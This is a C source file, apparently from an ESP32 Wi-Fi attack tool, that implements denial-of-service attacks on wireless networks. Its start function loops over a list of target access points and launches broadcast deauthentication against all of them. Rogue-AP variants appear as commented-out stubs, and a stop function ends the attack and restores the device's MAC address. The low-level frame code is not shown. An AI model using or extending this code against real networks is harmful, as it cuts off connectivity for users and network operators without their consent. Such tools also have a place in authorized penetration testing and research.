/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements DoS attacks using deauthentication methods
 */
#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"

static const char *TAG = "main:attack_dos";
static attack_dos_methods_t method = -1;

void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS attack...");
    method = attack_config->method;
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            ESP_LOGI(TAG, "ATTACK_DOS_METHOD_BROADCAST starting for mutiple APs listed below");
            for (int i=0; i< attack_config->actualAmount; i++) {
                ESP_LOGI(TAG, "About to invoke ATTACK_DOS_METHOD_BROADCAST 4 SSID: %s", attack_config->ap_records[i].ssid);
                ESP_LOGI(TAG, "Channel is: %d", attack_config->ap_records[i].primary);
            }
            ESP_LOGI(TAG, "Integrity check before function call:");
            for (int i = 0; i < attack_config->actualAmount; i++) {
                ESP_LOGI(TAG, "SSID: %s, Channel: %d", attack_config->ap_records[i].ssid, attack_config->ap_records[i].primary);
            }
            attack_method_broadcast_multiple_ap(attack_config->ap_records, attack_config->actualAmount, 1);
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            //TODO fix me attack_method_rogueap(attack_config->ap_record);
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            ESP_LOGD(TAG, "ATTACK_DOS_METHOD_ROGUE_AP");
            //TODO fix me attack_method_rogueap(attack_config->ap_record);
            //TODO fix me attack_method_broadcast(attack_config->ap_record, 1);
            break;
        default:
            ESP_LOGE(TAG, "Method unknown! DoS attack not started.");
    }
}

void attack_dos_stop() {
    switch(method){
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_DOS_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_COMBINE_ALL:
            attack_method_broadcast_stop();
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    ESP_LOGI(TAG, "DoS attack stopped");
}